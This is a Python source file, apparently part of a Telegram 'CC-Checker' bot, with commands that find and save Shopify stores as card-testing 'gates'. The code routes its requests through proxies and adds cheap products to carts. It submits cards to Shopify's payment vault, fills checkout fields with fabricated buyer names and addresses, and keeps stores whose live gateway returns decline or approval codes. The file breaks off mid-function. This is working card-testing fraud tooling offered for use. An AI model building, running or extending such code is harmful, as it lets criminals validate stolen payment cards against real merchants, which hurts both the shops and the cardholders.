"""
handlers/shopify_handler.py — Bot Commands for Shopify Gate Management

Commands:
  /addshopify <url>     — Scan URL and add as Shopify gate if working
  /shopifygates         — List all saved Shopify gates
  /rmshopify <id>       — Remove a Shopify gate by ID (admin only)
  /scshopify <url>      — Scan only (don't save to DB)
  /massaddshopify       — Mass add Shopify sites from .txt file
  /shopscan <count>     — Auto-discover Shopify sites via dorks + save working ones
"""
import asyncio
import logging
import re
import os
import sys
import html as html_module
import json
import time

import aiohttp
from aiohttp import ClientTimeout, CookieJar
from pyrogram import Client, filters
from pyrogram import enums

import config
import database.db as db
from utils.error_handler import notify_owner_on_error


logger = logging.getLogger("CC-Checker.ShopifyHandler")

TIMEOUT       = ClientTimeout(total=25)
VAULT_TIMEOUT = ClientTimeout(total=12)

BROWSER_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/131.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Connection": "keep-alive",
    "sec-ch-ua": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
}

SEP = "━" * 22


def _is_owner(user_id: int) -> bool:
    return user_id in config.OWNER_IDS


def _extract_meta(html: str, name: str) -> str | None:
    m = re.search(
        r'name=["\']' + re.escape(name) + r'["\'][^>]+content=["\']([^"\']{3,})["\']',
        html
    )
    if not m:
        return None
    val = html_module.unescape(m.group(1)).strip()
    if val.startswith('"') and val.endswith('"'):
        val = val[1:-1]
    return val or None


def _pick_best_variant(products: list) -> dict | None:
    """Pick cheapest available variant between $0.50-$25, else cheapest overall."""
    candidates = []
    for p in products:
        for v in p.get("variants", []):
            if not v.get("available", True):
                continue
            try:
                price = float(v.get("price", 999))
            except Exception:
                continue
            if price <= 0:
                continue  # Skip free products — won't trigger payment flow
            candidates.append({
                "variant_id":    v.get("id"),
                "price":         f"{price:.2f}",
                "price_f":       price,
                "product_title": p.get("title", ""),
                "handle":        p.get("handle", ""),
            })

    if not candidates:
        return None

    # Preferred range: $0.50 to $25 (wide enough to find real products)
    preferred = [c for c in candidates if 0.50 <= c["price_f"] <= 25.0]
    if preferred:
        return min(preferred, key=lambda x: x["price_f"])
    # Fallback: cheapest available (anything above $0)
    return min(candidates, key=lambda x: x["price_f"])


def _extract_unique_id(html: str) -> str:
    """Extract unique_id from Shopify identification JWT in checkout HTML."""
    import base64 as _b64
    jwts = re.findall(r'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+', html)
    for jwt in jwts:
        try:
            parts = jwt.split(".")
            pad   = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(_b64.b64decode(pad))
            uid = payload.get("unique_id", "")
            if uid and len(uid) == 32:
                return uid
        except Exception:
            pass
    return ""


# ── Junk domain filter (never valid Shopify stores) ───────────────────────────
_JUNK_DOMAINS = {
    "google.com", "pornhub.com", "azure.com", "microsoft.com",
    "facebook.com", "twitter.com", "instagram.com", "youtube.com",
    "perf.com", "mict.com", "bard.google.com", "googleadservices.com",
    "francazure.com", "play.google.com",
}

def _is_junk_url(url: str) -> bool:
    return any(d in url for d in _JUNK_DOMAINS)


# ── US State code mapping ─────────────────────────────────────────────────────
_US_STATE_CODES = {
    "Alabama":"AL","Alaska":"AK","Arizona":"AZ","Arkansas":"AR","California":"CA",
    "Colorado":"CO","Connecticut":"CT","Delaware":"DE","Florida":"FL","Georgia":"GA",
    "Hawaii":"HI","Idaho":"ID","Illinois":"IL","Indiana":"IN","Iowa":"IA",
    "Kansas":"KS","Kentucky":"KY","Louisiana":"LA","Maine":"ME","Maryland":"MD",
    "Massachusetts":"MA","Michigan":"MI","Minnesota":"MN","Mississippi":"MS",
    "Missouri":"MO","Montana":"MT","Nebraska":"NE","Nevada":"NV","New Hampshire":"NH",
    "New Jersey":"NJ","New Mexico":"NM","New York":"NY","North Carolina":"NC",
    "North Dakota":"ND","Ohio":"OH","Oklahoma":"OK","Oregon":"OR","Pennsylvania":"PA",
    "Rhode Island":"RI","South Carolina":"SC","South Dakota":"SD","Tennessee":"TN",
    "Texas":"TX","Utah":"UT","Vermont":"VT","Virginia":"VA","Washington":"WA",
    "West Virginia":"WV","Wisconsin":"WI","Wyoming":"WY",
}

# Fallback addresses by country code — used when US delivery fails
_INTL_FALLBACK_ADDRESSES = {
    "GB": {"firstName":"James","lastName":"Smith","address1":"10 Downing Street","city":"London","province":"ENG","zip":"SW1A 2AA","country":"GB","email":"james.smith@gmail.com"},
    "CA": {"firstName":"Emily","lastName":"Brown","address1":"123 Queen St W","city":"Toronto","province":"ON","zip":"M5H 2M9","country":"CA","email":"emily.b@gmail.com"},
    "AU": {"firstName":"Liam","lastName":"Wilson","address1":"1 Martin Place","city":"Sydney","province":"NSW","zip":"2000","country":"AU","email":"liam.w@gmail.com"},
    "DE": {"firstName":"Hans","lastName":"Mueller","address1":"Unter den Linden 1","city":"Berlin","province":"BE","zip":"10117","country":"DE","email":"hans.m@gmail.com"},
    "FR": {"firstName":"Pierre","lastName":"Dupont","address1":"1 Rue de Rivoli","city":"Paris","province":"IDF","zip":"75001","country":"FR","email":"p.dupont@gmail.com"},
    "NL": {"firstName":"Jan","lastName":"de Vries","address1":"Kalverstraat 1","city":"Amsterdam","province":"NH","zip":"1012 NX","country":"NL","email":"jan.devries@gmail.com"},
    "NZ": {"firstName":"Oliver","lastName":"Taylor","address1":"1 Queen Street","city":"Auckland","province":"AUK","zip":"1010","country":"NZ","email":"o.taylor@gmail.com"},
}
_DELIVERY_TRY_COUNTRIES = ["US", "GB", "CA", "AU", "DE", "FR", "NL", "NZ"]

# Fallback US addresses if API is unavailable
_FALLBACK_US_ADDRESSES = [
    {"firstName":"John","lastName":"Smith","address1":"123 Main St","city":"Austin","province":"TX","zip":"78701","email":"john.smith@gmail.com"},
    {"firstName":"Sarah","lastName":"Johnson","address1":"456 Oak Ave","city":"Phoenix","province":"AZ","zip":"85001","email":"sarah.j@gmail.com"},
    {"firstName":"Mike","lastName":"Davis","address1":"789 Pine Rd","city":"Denver","province":"CO","zip":"80201","email":"m.davis@gmail.com"},
    {"firstName":"Emily","lastName":"Wilson","address1":"321 Elm St","city":"Seattle","province":"WA","zip":"98101","email":"emily.w@gmail.com"},
    {"firstName":"Chris","lastName":"Brown","address1":"654 Maple Dr","city":"Portland","province":"OR","zip":"97201","email":"cbrown@gmail.com"},
    {"firstName":"Jessica","lastName":"Taylor","address1":"987 Cedar Ln","city":"Nashville","province":"TN","zip":"37201","email":"j.taylor@gmail.com"},
    {"firstName":"James","lastName":"Anderson","address1":"147 Birch Blvd","city":"Charlotte","province":"NC","zip":"28201","email":"j.anderson@gmail.com"},
    {"firstName":"Amanda","lastName":"Martinez","address1":"258 Spruce Way","city":"Atlanta","province":"GA","zip":"30301","email":"a.martinez@gmail.com"},
]





async def _scan_shopify_site(url: str) -> dict:

    """Full Shopify site scan with delivery handle, vault, card test, and OOS auto-recovery."""
    import urllib.parse as _urlparse

    base = url.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    result = {
        "url": base, "status": "FAIL", "reason": "",
        "is_shopify": False,
        "shop_domain": "", "shop_id": "", "variant_id": None,
        "product_title": "", "price": "", "currency": "USD",
        "checkout_type": "", "session_token": False, "vault_ok": False,
        "scan_data": {},
    }

    from core.proxy_manager import get_next_proxy, get_connector, get_proxy_kwargs
    proxy = get_next_proxy()
    proxy_kwargs = get_proxy_kwargs(proxy) if proxy else {}
    
    if proxy:
        conn = get_connector(proxy)
        logger.debug(f"Scanning {url} using proxy {proxy['host']}:{proxy['port']}")
    else:
        conn = aiohttp.TCPConnector(ssl=False, limit=3, force_close=True)

    jar = CookieJar(unsafe=True)
    try:
        async with aiohttp.ClientSession(connector=conn, cookie_jar=jar) as s:

            # ── 1. Homepage (follow redirect, update base URL) ─────────────
            try:
                async with s.get(base, headers=BROWSER_HEADERS, ssl=False,
                                  timeout=TIMEOUT, allow_redirects=True, **proxy_kwargs) as r:
                    hp = await r.text(errors="ignore")
                    final_url = str(r.url).rstrip("/")
                    # If redirected to custom domain, use that for non-API calls
                    if final_url != base and "myshopify.com" not in final_url:
                        result["scan_data"]["custom_domain"] = final_url
            except Exception as e:
                result["reason"] = f"Homepage error: {str(e)[:40]}"
                return result

            # Shopify detection — handles custom domains (Shopify CDN, window.Shopify, liquid templates)
            hp_lower = hp.lower()
            is_shopify = (
                "shopify" in hp_lower
                or "myshopify.com" in hp_lower
                or "cdn.shopify.com" in hp_lower
                or "window.shopify" in hp_lower
                or "shopify.theme" in hp_lower
                or "/a/sdk/shopify.js" in hp_lower
                or "monorail-edge.shopifysvc.com" in hp_lower
                or "shopify-payment-request" in hp_lower
                or "data-shopify" in hp_lower
            )
            if not is_shopify:
                result["reason"] = "Not a Shopify site"
                return result

            result["is_shopify"] = True

            m = re.search(r'["\']([\w\-]+\.myshopify\.com)["\']', hp)
            result["shop_domain"] = m.group(1) if m else ""
            m = re.search(r'["\']?shop(?:Id|_id)["\']?[\s:=]+(\d{5,12})', hp, re.I)
            result["shop_id"] = m.group(1) if m else ""

            # ── 2. Products ───────────────────────────────────────────────
            try:
                async with s.get(
                    base + "/products.json?limit=50",
                    headers={**BROWSER_HEADERS, "Accept": "application/json"},
                    ssl=False, timeout=TIMEOUT,
                    **proxy_kwargs
                ) as r:
                    pj = await r.json(content_type=None)
                products = pj.get("products", [])
            except Exception:
                result["reason"] = "Products API failed"
                return result

            if not products:
                result["reason"] = "No products found"
                return result

            variant = _pick_best_variant(products)
            if not variant:
                result["reason"] = "No available variants"
                return result

            result["variant_id"]    = variant["variant_id"]
            result["product_title"] = variant["product_title"]
            result["price"]         = variant["price"]
            result["scan_data"]["products_count"] = len(products)

            # ── 3. Add to cart (with OOS auto-recovery) ──────────────────────
            try:
                async with s.post(
                    base + "/cart/add.js",
                    data=f"id={variant['variant_id']}&quantity=1",
                    headers={
                        **BROWSER_HEADERS,
                        "Content-Type": "application/x-www-form-urlencoded",
                        "Accept": "application/json",
                        "X-Requested-With": "XMLHttpRequest",
                    },
                    ssl=False, timeout=TIMEOUT,
                    **proxy_kwargs
                ) as r:
                    if r.status == 422:
                        # Product out of stock — try to find a new in-stock product
                        logger.info(f"[Scan] {base}: variant {variant['variant_id']} is OOS, searching for new product...")
                        new_v = None
                        try:
                            async with s.get(
                                base + "/products.json?limit=50&page=2",
                                headers={**BROWSER_HEADERS, "Accept": "application/json"},
                                ssl=False, timeout=TIMEOUT, **proxy_kwargs
                            ) as r2:
                                pj2 = await r2.json(content_type=None)
                            new_products = pj2.get("products", []) + products
                            # Re-pick excluding the failed variant
                            for p in new_products:
                                for v in p.get("variants", []):
                                    if v.get("id") == variant["variant_id"] or not v.get("available", True):
                                        continue
                                    try:
                                        price = float(v.get("price", "9999"))
                                    except Exception:
                                        continue
                                    if price <= 25.0:
                                        new_v = {
                                            "variant_id":    v["id"],
                                            "price":         f"{price:.2f}",
                                            "product_title": f"{p['title']} - {v.get('title', '')}".strip(" -"),
                                        }
                                        break
                                if new_v:
                                    break
                        except Exception:
                            pass

                        if not new_v:
                            result["reason"] = "All products OOS (422)"
                            return result

                        # Retry cart add with new variant
                        variant = {**variant, **new_v}
                        result["variant_id"]    = new_v["variant_id"]
                        result["product_title"] = new_v["product_title"]
                        result["price"]         = new_v["price"]
                        async with s.post(
                            base + "/cart/add.js",
                            data=f"id={new_v['variant_id']}&quantity=1",
                            headers={
                                **BROWSER_HEADERS,
                                "Content-Type": "application/x-www-form-urlencoded",
                                "Accept": "application/json",
                            },
                            ssl=False, timeout=TIMEOUT, **proxy_kwargs
                        ) as r3:
                            if r3.status not in (200, 201):
                                result["reason"] = f"New variant cart add {r3.status}"
                                return result
                        logger.info(f"[Scan] {base}: switched to new variant {new_v['variant_id']} @ ${new_v['price']}")

                    elif r.status not in (200, 201):
                        result["reason"] = f"Cart add HTTP {r.status}"
                        return result
            except Exception as e:
                result["reason"] = f"Cart error: {str(e)[:40]}"
                return result

            # ── 4. Checkout page ──────────────────────────────────────────
            try:
                async with s.get(
                    base + "/checkout",
                    headers={**BROWSER_HEADERS, "Referer": base + "/cart"},
                    ssl=False, timeout=TIMEOUT,
                    allow_redirects=True, max_redirects=15,
                    **proxy_kwargs
                ) as r:
                    checkout_url  = str(r.url)
                    checkout_html = await r.text(errors="ignore")
                    if r.status not in (200, 201):
                        result["reason"] = f"Checkout HTTP {r.status}"
                        return result
            except Exception as e:
                result["reason"] = f"Checkout error: {str(e)[:40]}"
                return result

            session_token = _extract_meta(checkout_html, "serialized-sessionToken")
            layout        = _extract_meta(checkout_html, "serialized-checkoutLayout")
            checkout_sess = _extract_meta(checkout_html, "serialized-checkoutSessionIdentifier")
            stripe_pks    = re.findall(r'pk_(?:live|test)_[a-zA-Z0-9]{24,}', checkout_html)

            # Extract checkout_id from URL
            m_coid = re.search(r"/checkouts/cn/([a-zA-Z0-9]+)", checkout_url)
            checkout_id = m_coid.group(1) if m_coid else ""

            # Extract payment_method_id
            m_pmid = re.search(r'paymentMethodIdentifier["\s:=]+["\']([a-f0-9]{32})["\']', checkout_html)
            payment_method_id = m_pmid.group(1) if m_pmid else "dc2c83c064fc75ebc5dfa2b5bee4f873"

            # Extract unique_id from JWT (needed for delivery handle prefix)
            unique_id = _extract_unique_id(checkout_html)

            result["checkout_type"] = layout or "unknown"
            result["scan_data"].update({
                "checkout_url":       checkout_url,
                "checkout_id":        checkout_id,
                "checkout_sess":      checkout_sess,
                "layout":             layout,
                "stripe_pk":          stripe_pks,
                "html_size":          len(checkout_html),
                "payment_method_id":  payment_method_id,
            })

            if not session_token:
                result["reason"] = "No session token (JS-rendered checkout?)"
                return result

            result["session_token"] = True

            # ── 5. PCI Vault test ─────────────────────────────────────────
            try:
                async with s.post(
                    "https://checkout.pci.shopifyinc.com/sessions",
                    json={"credit_card": {"number": "4242424242424242", "name": "Test User",
                                          "month": 12, "year": 2028, "verification_value": "123"}},
                    headers={
                        "Authorization": f'Bearer "{session_token}"',
                        "Content-Type":  "application/json",
                        "Accept":        "application/json",
                        "Origin":        "https://checkout.pci.shopifyinc.com",
                        "Referer":       checkout_url,
                        "User-Agent":    BROWSER_HEADERS["User-Agent"],
                    },
                    ssl=False, timeout=VAULT_TIMEOUT,
                    **proxy_kwargs
                ) as r:
                    vault_status = r.status
                    vault_body   = await r.text(errors="ignore")
            except Exception as e:
                vault_status = 0
                vault_body   = str(e)[:100]

            result["scan_data"]["vault_status"]   = vault_status
            result["scan_data"]["vault_response"] = vault_body[:150]

            try:
                vj = json.loads(vault_body)
                result["vault_ok"] = bool(vj.get("id") or vault_status == 422)
            except Exception:
                result["vault_ok"] = vault_status == 422

            # ── 6. Delivery handle — use SAME checkout cart (cookie) ──────
            # Key fix: cart cookie = checkout_id?key=... -> same session GID
            delivery_handle = ""
            if result["vault_ok"]:
                try:
                    sf_ep  = base + "/api/2024-01/graphql.json"
                    sf_hdr = {**BROWSER_HEADERS, "Accept": "application/json",
                              "Content-Type": "application/json"}

                    # Get cart GID from cookie (same session as checkout)
                    cart_gid = ""
                    try:
                        for cookie in s.cookie_jar:
                            if cookie.key == "cart":
                                val = _urlparse.unquote(cookie.value)
                                if "?key=" in val:
                                    cart_gid = f"gid://shopify/Cart/{val}"
                                    break
                    except Exception:
                        pass

                    if not cart_gid:
                        # Fallback: create new cart
                        async with s.post(sf_ep, json={"query": """mutation cartCreate($input: CartInput!) {
  cartCreate(input: $input) { cart { id } userErrors { message } }
}""", "variables": {"input": {"lines": [{"merchandiseId": f"gid://shopify/ProductVariant/{variant['variant_id']}", "quantity": 1}]}}},
                            headers=sf_hdr, ssl=False, timeout=ClientTimeout(total=10), **proxy_kwargs) as r:
                            cj_r = await r.json(content_type=None)
                        cart_gid = ((cj_r.get("data") or {}).get("cartCreate") or {}).get("cart", {}).get("id", "")

                    if cart_gid:
                        import random as _rr
                        # Try up to 3 different hardcoded US addresses (no API needed)
                        for _addr_attempt in range(3):
                            addr = _rr.choice(_FALLBACK_US_ADDRESSES)
                            async with s.post(sf_ep, json={"query": """mutation cartBuyerIdentityUpdate($cartId: ID!, $buyerIdentity: CartBuyerIdentityInput!) {
  cartBuyerIdentityUpdate(cartId: $cartId, buyerIdentity: $buyerIdentity) {
    cart { deliveryGroups(first: 3) { nodes { deliveryOptions { handle title } } } }
    userErrors { message }
  }
}""", "variables": {
                                "cartId": cart_gid,
                                "buyerIdentity": {
                                    "email": addr["email"],
                                    "countryCode": "US",
                                    "deliveryAddressPreferences": [{"deliveryAddress": {
                                        "firstName": addr["firstName"],
                                        "lastName":  addr["lastName"],
                                        "address1":  addr["address1"],
                                        "city":      addr["city"],
                                        "province":  addr["province"],
                                        "zip":       addr["zip"],
                                        "country":   "US",
                                    }}]
                                }
                            }}, headers=sf_hdr, ssl=False, timeout=ClientTimeout(total=12), **proxy_kwargs) as r:
                                dj = await r.json(content_type=None)


                            nodes = (((dj.get("data") or {}).get("cartBuyerIdentityUpdate") or {})
                                     .get("cart", {}).get("deliveryGroups", {}).get("nodes") or [])
                            if nodes:
                                opts = nodes[0].get("deliveryOptions") or []
                                if opts:
                                    rate_handle = opts[0].get("handle", "")
                                    if unique_id and rate_handle:
                                        delivery_handle = f"{unique_id}-{rate_handle}"
                                    elif rate_handle:
                                        delivery_handle = rate_handle
                                    result["scan_data"]["delivery_addr"] = f"{addr['city']}, {addr['province']}"
                                    result["scan_data"]["delivery_country"] = "US"
                                    break  # Found delivery handle — stop retrying
                        # No US delivery found — try other countries

                    # ── Try international countries if US delivery failed ────
                    if not delivery_handle and cart_gid:
                        for country_code in ["GB", "CA", "AU", "DE", "FR", "NL", "NZ"]:
                            intl_addr = _INTL_FALLBACK_ADDRESSES.get(country_code, {})
                            if not intl_addr:
                                continue
                            try:
                                async with s.post(sf_ep, json={"query": """mutation cartBuyerIdentityUpdate($cartId: ID!, $buyerIdentity: CartBuyerIdentityInput!) {
  cartBuyerIdentityUpdate(cartId: $cartId, buyerIdentity: $buyerIdentity) {
    cart { deliveryGroups(first: 3) { nodes { deliveryOptions { handle title } } } }
    userErrors { message }
  }
}""", "variables": {
                                    "cartId": cart_gid,
                                    "buyerIdentity": {
                                        "email": intl_addr["email"],
                                        "countryCode": country_code,
                                        "deliveryAddressPreferences": [{"deliveryAddress": {
                                            "firstName": intl_addr["firstName"],
                                            "lastName":  intl_addr["lastName"],
                                            "address1":  intl_addr["address1"],
                                            "city":      intl_addr["city"],
                                            "province":  intl_addr.get("province",""),
                                            "zip":       intl_addr["zip"],
                                            "country":   country_code,
                                        }}]
                                    }
                                }}, headers=sf_hdr, ssl=False, timeout=ClientTimeout(total=12), **proxy_kwargs) as r:
                                    dj2 = await r.json(content_type=None)

                                nodes2 = (((dj2.get("data") or {}).get("cartBuyerIdentityUpdate") or {})
                                         .get("cart", {}).get("deliveryGroups", {}).get("nodes") or [])
                                if nodes2:
                                    opts2 = nodes2[0].get("deliveryOptions") or []
                                    if opts2:
                                        rate_handle2 = opts2[0].get("handle", "")
                                        if unique_id and rate_handle2:
                                            delivery_handle = f"{unique_id}-{rate_handle2}"
                                        elif rate_handle2:
                                            delivery_handle = rate_handle2
                                        result["scan_data"]["delivery_addr"]    = f"{intl_addr['city']}, {country_code}"
                                        result["scan_data"]["delivery_country"] = country_code
                                        break  # found!
                            except Exception:
                                continue

                except Exception as e:
                    result["scan_data"]["delivery_handle_error"] = str(e)[:80]

            result["scan_data"]["delivery_handle"] = delivery_handle

            # ── Gate quality check ─────────────────────────────────────────
            if not result["vault_ok"]:
                result["reason"] = f"PCI Vault failed (status {vault_status}) — Shopify Payments not active"
                return result

            if not delivery_handle:
                result["reason"] = "No delivery option found (tried US/GB/CA/AU/DE/FR/NL/NZ)"
                return result

            # ── 7. Real card gateway test ──────────────────────────────────

            # Test with a known-dead generic card to confirm gateway is live.
            # A live gateway always returns DECLINED or VBV for this card.
            # cart_error / no_payment / exception = store is broken → don't save.
            result["scan_data"]["card_test"] = "pending"
            try:
                from gateways.shopify_gate import check_shopify as _check_shopify, invalidate_stores_cache
                from core.parser import CardData as _CardData
                import database.db as _db

                # Build a minimal store dict as the gate expects
                _store_override = {
                    "base_url":         base,
                    "variant_id":       result["variant_id"],
                    "price":            result["price"],
                    "currency":         result["currency"],
                    "payment_method_id": payment_method_id,
                    "gate_id":          None,  # no DB id yet
                    "scan_data":        result["scan_data"],
                }

                # Generic test card — always declined on a live gateway, never charged
                _test_card = _CardData(
                    number="4242424242424242",
                    month="12",
                    year="2028",
                    cvv="123",
                )

                # Temporarily inject the store into the gate's cache so check_shopify uses it
                from gateways import shopify_gate as _sg
                _old_cache = list(_sg._stores_cache)
                _sg._stores_cache = [_store_override]
                _sg._stores_cache_ts = 1e18  # very far future → won't reload

                try:
                    _test_result = await _check_shopify(_test_card)
                finally:
                    # Restore original cache
                    _sg._stores_cache = _old_cache
                    _sg._stores_cache_ts = 0.0

                gate_status_code = _test_result.raw_code or ""
                gate_msg         = _test_result.message or ""
                result["scan_data"]["card_test"] = f"{gate_status_code} | {gate_msg[:60]}"

                # GOOD responses = gateway is live:
                # ANY card-level result means the gateway processed it.
                # Infra errors (timeout, cart_error, etc.) = store is broken.
                GATEWAY_LIVE_CODES = {
                    "declined",         # Hard decline by bank
                    "bank_response",    # Bank responded (DO_NOT_HONOR, etc.)
                    "do_not_honor",     # GENERIC_ERROR mapped to DO_NOT_HONOR
                    "vbv",              # 3DS/VBV required
                    "3ds",              # 3DS required
                    "submit_failed",    # Submit returned failure (gateway processed)
                    "insufficient",     # Insufficient funds
                    "stolen_card",      # Pickup/stolen card
                    "approved",         # Test card approved (gateway is live!)
                    "charged",          # Same as approved
                }

                if gate_status_code not in GATEWAY_LIVE_CODES:
                    result["reason"] = f"Gateway test failed: {gate_msg[:60]} [{gate_status_code}]"
                    return result

                # If we got here, gateway is live ✅
                result["scan_data"]["gateway_test_shot"] = _test_result.raw_code

            except Exception as _e:
                # If card test itself throws an exception, be conservative and skip store
                result["reason"] = f"Card test exception: {str(_e)[:60]}"
                return result

            result["status"] = "WORKING"
            result["reason"] = (
                f"Shopify Payments | {layout or 'checkout'} | "
                f"${result['price']} {result['currency']} | "
                f"VAULT OK | HANDLE OK | GATEWAY LIVE"
            )

    except asyncio.TimeoutError:
        result["reason"] = "Timeout"
    except Exception as e:
        result["reason"] = f"Error: {str(e)[:60]}"

    return result



# ── /addshopify ────────────────────────────────────────────────────────────────
async def cmd_add_shopify(client: Client, message):
    user_id = message.from_user.id

    parts = message.text.strip().split()
    if len(parts) < 2:
        await message.reply(
            "**Usage:** `/addshopify <url>`\n\n"
            "**Example:** `/addshopify https://store.dftba.com`\n\n"
            "The bot will:\n"
            "1. Scan the site\n"
            "2. Find cheapest product ($1-$10)\n"
            "3. Test cart + checkout + vault\n"
            "4. Save to DB if working",
            parse_mode=enums.ParseMode.MARKDOWN,
        )
        return

    url = parts[1].strip()
    if not url.startswith("http"):
        url = "https://" + url

    msg = await message.reply(
        f"🔍 **Scanning Shopify site...**\n\n"
        f"`{url}`\n\n"
        f"⏳ Testing cart → checkout → vault...",
        parse_mode=enums.ParseMode.MARKDOWN,
    )

    result = await _scan_shopify_site(url)

    if result["status"] != "WORKING":
        await msg.edit_text(
            f"❌ **Scan Failed**\n\n"
            f"`{url}`\n\n"
            f"**Reason:** `{result['reason']}`\n\n"
            f"This site cannot be used as a Shopify gate.",
            parse_mode=enums.ParseMode.MARKDOWN,
        )
        return

    # Save to DB
    gate_id = await db.add_shopify_gate(
        base_url=result["url"],
        variant_id=result["variant_id"],
        price=result["price"],
        product_title=result["product_title"],
        shop_domain=result["shop_domain"],
        shop_id=result["shop_id"],
        currency=result["currency"],
        checkout_type=result["checkout_type"],
        added_by=user_id,
        scan_data=result.get("scan_data", {}),
    )

    sd = result.get("scan_data", {})
    stripe_info = f"\n**Stripe PK:** `{sd['stripe_pk'][0][:30]}...`" if sd.get("stripe_pk") else ""
    vault_info  = "✅ Vault tested OK" if result["vault_ok"] else "⚠️ Vault untested"

    await msg.edit_text(
        f"✅ **Shopify Gate Added!**\n\n"
        f"{SEP}\n"
        f"**Gate ID:** `#{gate_id}`\n"
        f"**URL:** `{result['url']}`\n"
        f"**Shop:** `{result['shop_domain'] or 'unknown'}`\n"
        f"{SEP}\n"
        f"**Product:** `{result['product_title'][:40]}`\n"
        f"**Variant ID:** `{result['variant_id']}`\n"
        f"**Charge Amount:** `${result['price']} {result['currency']}`\n"
        f"**Checkout Type:** `{result['checkout_type']}`\n"
        f"**PCI Vault:** `{vault_info}`\n"
        f"{stripe_info}\n"
        f"{SEP}\n"
        f"Use `/shopifygates` to see all gates.",
        parse_mode=enums.ParseMode.MARKDOWN,
    )


# ── /scshopify (scan only, no save) ───────────────────────────────────────────
async def cmd_scan_shopify(client: Client, message):
    parts = message.text.strip().split()
    if len(parts) < 2:
        await message.reply(
            "**Usage:** `/scshopify <url>`\n\n"
            "Scans site without saving to DB.",
            parse_mode=enums.ParseMode.MARKDOWN,
        )
        return

    url = parts[1].strip()
    if not url.startswith("http"):
        url = "https://" + url

    msg = await message.reply(
        f"🔍 **Scanning (test only)...**\n`{url}`",
        parse_mode=enums.ParseMode.MARKDOWN,
    )

    result = await _scan_shopify_site(url)
    sd     = result.get("scan_data", {})

    if result["status"] == "WORKING":
        stripe_info = f"\n**Stripe PK:** `{sd['stripe_pk'][0][:30]}...`" if sd.get("stripe_pk") else ""
        await msg.edit_text(
            f"✅ **Site is Working!**\n\n"
            f"{SEP}\n"
            f"**URL:** `{url}`\n"
            f"**Shop:** `{result['shop_domain'] or 'unknown'}`\n"
            f"**Shop ID:** `{result['shop_id'] or 'N/A'}`\n"
            f"{SEP}\n"
            f"**Product:** `{result['product_title'][:40]}`\n"
            f"**Variant ID:** `{result['variant_id']}`\n"
            f"**Charge:** `${result['price']} {result['currency']}`\n"
            f"**Checkout:** `{result['checkout_type']}`\n"
            f"**Session Token:** `{'✅ Found' if result['session_token'] else '❌ Not found'}`\n"
            f"**PCI Vault:** `{'✅ OK' if result['vault_ok'] else '⚠️ Untested'}`\n"
            f"**Vault Status:** `{sd.get('vault_status', '?')}`\n"
            f"**Products found:** `{sd.get('products_count', '?')}`\n"
            f"{stripe_info}\n"
            f"{SEP}\n"
            f"Use `/addshopify {url}` to save to DB.",
            parse_mode=enums.ParseMode.MARKDOWN,
        )
    else:
        await msg.edit_text(
            f"❌ **Site Not Working**\n\n"
            f"`{url}`\n\n"
            f"**Reason:** `{result['reason']}`\n\n"
            f"**Is Shopify:** `{result['is_shopify']}`\n"
            f"**Products:** `{sd.get('products_count', '0')}`\n"
            f"**Checkout HTML:** `{sd.get('html_size', '0')} bytes`\n"
            f"**Vault Status:** `{sd.get('vault_status', 'N/A')}`",
            parse_mode=enums.ParseMode.MARKDOWN,
        )


# ── /shopifygates ──────────────────────────────────────────────────────────────
async def cmd_shopify_gates(client: Client, message):
    gates = await db.get_active_shopify_gates(limit=20)
    count = await db.get_shopify_gates_count()

    if not gates:
        await message.reply(
            "📭 **No Shopify gates in DB yet!**\n\n"
            "Use `/addshopify <url>` to add one.\n"
            "Use `/scshopify <url>` to test without saving.",
            parse_mode=enums.ParseMode.MARKDOWN,
        )
        return

    lines = [f"🛒 **Shopify Gates** ({count['total']} total)\n{SEP}"]
    for g in gates[:15]:
        from urllib.parse import urlparse
        domain = urlparse(g["base_url"]).netloc or g["base_url"]
        ratio  = ""
        tot    = g["success_count"] + g["fail_count"]
        if tot > 0:
            pct   = int(g["success_count"] / tot * 100)
            ratio = f" | {pct}% success"
        lines.append(
            f"**#{g['id']}** `{domain}`\n"
            f"  💰 `${g['price']}` | 🏷 `{g['product_title'][:25]}`\n"
            f"  ✅ {g['success_count']} | ❌ {g['fail_count']}{ratio}\n"
        )

    lines.append(f"{SEP}")
    lines.append("**Commands:**")
    lines.append("`/addshopify <url>` — Add new gate")
    lines.append("`/scshopify <url>` — Scan only")
    lines.append("`/rmshopify <id>` — Remove gate (admin)")

    await message.reply(
        "\n".join(lines),
        parse_mode=enums.ParseMode.MARKDOWN,
    )


# ── /rmshopify ─────────────────────────────────────────────────────────────────
async def cmd_rm_shopify(client: Client, message):
    if not _is_owner(message.from_user.id):
        await message.reply("❌ Admin only command.")
        return

    parts = message.text.strip().split()
    if len(parts) < 2:
        await message.reply("Usage: `/rmshopify <gate_id>`", parse_mode=enums.ParseMode.MARKDOWN)
        return

    try:
        gate_id = int(parts[1])
    except ValueError:
        await message.reply("❌ Invalid gate ID. Use a number.")
        return

    await db.disable_shopify_gate(gate_id)
    await message.reply(f"✅ Shopify gate **#{gate_id}** disabled.", parse_mode=enums.ParseMode.MARKDOWN)


# ── /massaddshopify (mass scan & add from .txt file or text list) ────────────────
async def cmd_mass_add_shopify(client: Client, message):
    if not _is_owner(message.from_user.id):
        await message.reply("❌ Owner only command.")
        return

    urls = []
    
    doc_msg = None
    if message.document:
        doc_msg = message
    elif message.reply_to_message and message.reply_to_message.document:
        doc_msg = message.reply_to_message

    if doc_msg:
        doc = doc_msg.document
        if doc.file_size > 500_000:
            await message.reply("❌ Max file size is 500KB.")
            return
        wait = await message.reply("📥 Downloading shopify sites list...", parse_mode=enums.ParseMode.MARKDOWN)
        tmp_path = None
        try:
            tmp_path = await client.download_media(doc)
            with open(tmp_path, "r", encoding="utf-8", errors="ignore") as f:
                lines = [l.strip() for l in f.readlines() if l.strip()]
        except Exception as e:
